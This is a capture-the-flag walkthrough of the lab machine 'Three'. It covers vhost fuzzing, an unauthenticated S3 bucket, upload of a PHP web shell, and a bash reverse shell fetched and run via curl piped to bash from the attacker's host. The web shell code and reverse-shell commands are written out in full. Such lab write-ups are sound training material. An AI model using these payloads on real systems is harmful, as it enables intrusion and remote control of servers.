## Name: Three   //   Difficulty: Very Easy   //   Topic: Web Virtual Hosting, S3, PHP Web Shell, Reverse Shell    
#### By: Kyle Zimmer    
       
**Overview: During this challenge, I was able to find a web server with a few virtual routes to other subdomains discovered through fuzzing. After attempting to access them, one stood out, providing the status of a running s3 bucket backend. I then used the AWScli utility to interact with it, finding out it didn't check the provided credentials... allowing me to list and cp files to the backend of the web server. I used this capability to upload a simple php web shell that'd allow me to launch commands as the web server. Using the web shell, I had the server reach out and grab and execute a bash script that called back to a netcat listener on my system, giving me an interactive bash shell on the server... allowing me to traverse the backend file system in its entirety.**     

<img width="267" height="103" alt="image" src="https://github.com/user-attachments/assets/604ce017-f0f4-4e51-a528-cabe5b2a6566" />    

Getting started, let's start with our usual port scan, followed by a more in-depth version and script scan against the identified ports:  
- `sudo nmap -sS -Pn -n --disable-arp-ping --top-ports 10000 [target ip] -oG`   
- `sudo nmap -sT -Pn -n --disable-arp-ping -O -sV -sC -p [port1,port2] [target ip]`   
- If we suspect UDP and we have the time: `sudo nmap -sU -Pn -n --disable-arp-ping [target ip]`   

Being that we know this box is likely to be a Linux web server with a back-end S3 bucket storage utility, I'll move forward confidently with just the top 1500 ports and then looking at those TCP ports closely...     
   
<img width="686" height="197" alt="image" src="https://github.com/user-attachments/assets/b4800901-6be1-4f16-87f2-9956ff138348" />    

<img width="868" height="417" alt="image" src="https://github.com/user-attachments/assets/d2e569ba-586a-43a8-932d-f3eb0ec5a6aa" />   

Let's look at the HTTP headers and response we get from this web server using curl:    
- `curl -v [target ip]`

<img width="937" height="605" alt="image" src="https://github.com/user-attachments/assets/6a4d240a-2ae8-4433-ac7a-9e51cd345ecd" />   

Everything seems to load correctly. Looks like a music group's band page with contact information and tour data. Let's see how this renders in our browser.  

<img width="1388" height="984" alt="image" src="https://github.com/user-attachments/assets/62ddcfb1-e3dd-4b18-a12d-6c645e206546" />   

<img width="984" height="822" alt="image" src="https://github.com/user-attachments/assets/46f24992-e5d0-4519-b878-e06cab5329e5" />   

The "Buy Tickets" section doesn't really work.   

The contact section seems to have some functionality with its backend being made-up by PHP code. It's sends your inputted data to **action_page**.php?Name=...&Email=...&Message=... 

<img width="1175" height="290" alt="image" src="https://github.com/user-attachments/assets/e7be8294-b61e-4fc8-b164-e8a57de3475a" />   

I don't entirely know what this means, but we will note it as a data point. Wildcards, file paths, and remote urls give the same results.  Other than that, all the buttons at the top are just redirectors to sections of the static page. The search feature at the top also doesn't work. Let's look for some hidden directories on this server with gobuster:

One other thing I noticed in the contact section was the email domain they're using. It's different than the IP we used to access their sites. Let's try and resolve the domain: thetoppers.htb on both HTTP and HTTPS.
  
<img width="1181" height="757" alt="image" src="https://github.com/user-attachments/assets/769b40c1-87ab-4ba7-8164-2c38fc3fd480" />  

Hmm... Let's just add it as the domain pointing to the IPv4 address we just visited by adding it to our /etc/hosts file. `sudo vim /etc/hosts`

<img width="499" height="224" alt="image" src="https://github.com/user-attachments/assets/2e40e684-bc7a-4130-b970-ee9122d695fd" />  

And now to test it...   

<img width="1388" height="697" alt="image" src="https://github.com/user-attachments/assets/205e0d12-0530-4fe9-8a77-8304f5d68dbe" />   

Like a charm. Okay. We have a domain pointing to an IP address... We know it's SSH accesssible (no creds)... let's quickly test passwordless logins for SSH.   

<img width="680" height="779" alt="image" src="https://github.com/user-attachments/assets/99652136-400f-4126-b970-59869df13dc9" />   

Worth the shot, but didn't work. Let's go after hidden directories (+ robots.txt) and then subdomains using gobuster!  
- `sudo gobuster dir --url thetoppers.htb --wordlist /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --ne`  
- `sudo gobuster dns --domain thetoppers.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt`  
- `sudo gobuster vhost -u http://thetoppers.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -r --ad`   

<img width="1020" height="369" alt="image" src="https://github.com/user-attachments/assets/1277a568-2fa1-4c86-b814-302ad70910b9" />

No interesting resources in the subdirectories that I could find...   

<img width="1035" height="415" alt="image" src="https://github.com/user-attachments/assets/5f45b517-c919-41db-b68e-7978f6b12a6e" />

Even after changing `--resolver /etc/hosts`, I still couldn't get it to validate the base domain or find any subdomains of the main site.  

<img width="1040" height="391" alt="image" src="https://github.com/user-attachments/assets/7d361120-3af5-4962-97c7-94a716b6b6c5" />   

Looks like Virtual Hosts (VHost) scanning is what I was looking to find behind the domain. Let's try and resolve it in our /etc/hosts.

<img width="484" height="238" alt="image" src="https://github.com/user-attachments/assets/c256fafe-022b-4810-97b6-d565bd68043c" />

Because I can't resolve these domains by browsing to them, I need to (again) put them in my /etc/hosts file in order to populate my HTTP request's `Host: ` header in order to reach the resources: `sudo vim /etc/hosts`   

<img width="710" height="253" alt="image" src="https://github.com/user-attachments/assets/04cce0da-b8a0-477c-9fa1-b7914386e028" />  

<img width="820" height="265" alt="image" src="https://github.com/user-attachments/assets/e794e285-f87c-48c7-8257-694f0130c10f" />  

www and mail resolve to the main page.

<img width="817" height="210" alt="image" src="https://github.com/user-attachments/assets/655a7c54-18c4-44e5-a70e-843ccc554748" />   

Well, we get something different with `http://s3.thetoppers.htb` it shows some json of {"Status": "running"}. After looking into s3 subdomains, it indicates that they're using a backend storage utility. From reading the [AWS user resources for accessing buckets](https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-bucket-intro.html), we can use the AWSCLI to try and interact with it remotely.

Our resource specifies that we need to provide authentication creds with `aws configure`, but we don't have any... so let's try just supplying some fooey before requesting the s3 bucket virtual host link followed by `s3 ls` to list the buckets on this host.    
  
<img width="750" height="172" alt="image" src="https://github.com/user-attachments/assets/73f83254-bb67-4523-84f6-9b422e2f2126" />    

Now let's go ahead and look for stuff inside that bucket by specifying `s3://[bucketname]` at the end of our previous ls command.    

<img width="589" height="102" alt="image" src="https://github.com/user-attachments/assets/9d293f9e-051f-42c0-b083-3e641ae1a8f9" />   

A web access (.htaccess) file, index.php file, and images directory. Looks just like the results from our directory scan of the initial domain thetoppers.htb. This is most likely the root directory of that site stored in the cloud. I'd like to try getting access to a shell on this web server.   

Just like the `ls` command, the awscli has a `cp` command to allow us to upload files to s3 buckets. My thinking is that if we can get a file into this bucket, we can access/run it from the php website on the original domain.   

`awscli http://s3.thetoppers.htb s3 cp [filename] s3://thetoppers.htb`   

Now let's find a php shell file. I like the one from [Sente on github](https://gist.github.com/sente/4dbb2b7bdda2647ba80b).  
- `<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>` in a fooey.php file.  

<img width="961" height="222" alt="image" src="https://github.com/user-attachments/assets/616fd0e1-318c-4aac-8845-680c88fc5816" />     

It should be there now... let's browse and see if it works with "thetopper.htb/fooey.php?cmd=[system command]"  

<img width="751" height="158" alt="image" src="https://github.com/user-attachments/assets/7973945b-9b87-4205-a733-fb02ffcc4ebc" />  

<img width="866" height="988" alt="image" src="https://github.com/user-attachments/assets/5d7b61c1-10c6-4c65-b4b7-069161c4a915" />   

Now let's go ahead and create and upload a bash reverse shell (bash -i >& /dev/tcp/10.10.14.128/1337 0>&1) that'll curl and execute (http://thetoppers.htb/fooey.php?cmd=curl 10.10.14.128:8000/shell.sh|bash) the shell file, which will create a reverse connection to a netcat listeer `nc -lvp 1337`    
 
<img width="883" height="63" alt="image" src="https://github.com/user-attachments/assets/8cd2da87-27ce-49a6-a821-72e2a9ca59fe" />   

And we'll need to start a python web server on our local machine (`python3 -m http.server 8000`) to host the bash shell to be downloaded.    

Now we browse to the web page with the fooey.php link with the reverse shell bash command and receive an interactive shell on our netcat.    
  
<img width="645" height="175" alt="image" src="https://github.com/user-attachments/assets/ceb7c6b7-a17e-468f-b1ee-c149f4178990" />   
   
<img width="966" height="285" alt="image" src="https://github.com/user-attachments/assets/b9ea1874-3f13-40b8-a14d-3226dbc7a4ba" />   
  
<img width="779" height="205" alt="image" src="https://github.com/user-attachments/assets/6453efdd-7b05-441c-9d13-45428bcab05c" />    
    
<img width="457" height="277" alt="image" src="https://github.com/user-attachments/assets/dc7f0a9f-b3a7-4a33-8957-05bdb7e3f1b5" />     
   
<img width="511" height="489" alt="image" src="https://github.com/user-attachments/assets/8d143bdc-f376-42f6-850a-6a4143a7a67b" />       



 
Note: Don’t submit the flag that appeared on my screen. It is unique to my account and will cause your account to be flagged for cheating.       
